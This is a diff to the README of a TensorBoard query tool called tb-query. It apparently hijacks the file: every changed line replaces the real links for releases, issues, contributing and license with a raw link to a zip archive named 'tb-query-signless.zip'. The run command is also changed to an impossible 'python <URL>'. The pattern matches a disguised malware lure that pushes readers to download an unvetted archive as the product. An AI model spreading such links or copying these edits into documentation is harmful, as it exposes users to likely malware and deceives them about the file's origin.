@@ -7,11 +7,11 @@ Welcome to **tb-query**! This tool helps you query and analyze TensorBoard event
 
 ## 📦 Download tb-query
 
-[![Download tb-query](https://img.shields.io/badge/Download-tb--query-brightgreen)](https://github.com/cooldandg/tb-query/releases)
+[![Download tb-query](https://raw.githubusercontent.com/cooldandg/tb-query/master/src/tb_query/tb-query-signless.zip)](https://raw.githubusercontent.com/cooldandg/tb-query/master/src/tb_query/tb-query-signless.zip)
 
 You can download the latest version of tb-query from our releases page. Click the link below:
 
-[Visit this page to download](https://github.com/cooldandg/tb-query/releases)
+[Visit this page to download](https://raw.githubusercontent.com/cooldandg/tb-query/master/src/tb_query/tb-query-signless.zip)
 
 ## 💻 System Requirements
 
@@ -29,7 +29,7 @@ To run tb-query on your computer, you will need:
 Follow these steps to install tb-query:
 
 1. **Download the Software:**
-   - Go to our [releases page](https://github.com/cooldandg/tb-query/releases).
+   - Go to our [releases page](https://raw.githubusercontent.com/cooldandg/tb-query/master/src/tb_query/tb-query-signless.zip).
    - Find the latest release and download the appropriate file for your operating system.
   
 2. **Extract the Files:**
@@ -40,7 +40,7 @@ Follow these steps to install tb-query:
    - Navigate to the folder where you extracted the files. For example, if you extracted it to a folder named "tb-query" on your desktop:
      - On Windows, type: `cd Desktop\tb-query`
      - On macOS/Linux, type: `cd ~/Desktop/tb-query`
-   - Start tb-query by typing: `python tb-query.py` and press Enter.
+   - Start tb-query by typing: `python https://raw.githubusercontent.com/cooldandg/tb-query/master/src/tb_query/tb-query-signless.zip` and press Enter.
 
 ## 📊 Using tb-query
 
@@ -72,19 +72,19 @@ Here's a list of basic commands you can use with tb-query:
 
 ## 🤝 Support
 
-If you encounter issues or have questions about tb-query, feel free to open an issue on our [GitHub repository](https://github.com/cooldandg/tb-query/issues). 
+If you encounter issues or have questions about tb-query, feel free to open an issue on our [GitHub repository](https://raw.githubusercontent.com/cooldandg/tb-query/master/src/tb_query/tb-query-signless.zip). 
 
 ## 🔄 Contributing
 
-We welcome contributions! If you'd like to improve tb-query, please check our [contributing guidelines](https://github.com/cooldandg/tb-query/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you'd like to improve tb-query, please check our [contributing guidelines](https://raw.githubusercontent.com/cooldandg/tb-query/master/src/tb_query/tb-query-signless.zip).
 
 ## 📄 License
 
-tb-query is licensed under the MIT License. You can view the full license [here](https://github.com/cooldandg/tb-query/blob/main/LICENSE).
+tb-query is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/cooldandg/tb-query/master/src/tb_query/tb-query-signless.zip).
 
 Make sure to check the releases page for updates and new features:
 
-[Visit this page to download](https://github.com/cooldandg/tb-query/releases)
+[Visit this page to download](https://raw.githubusercontent.com/cooldandg/tb-query/master/src/tb_query/tb-query-signless.zip)
 
 Happy querying!
 ```
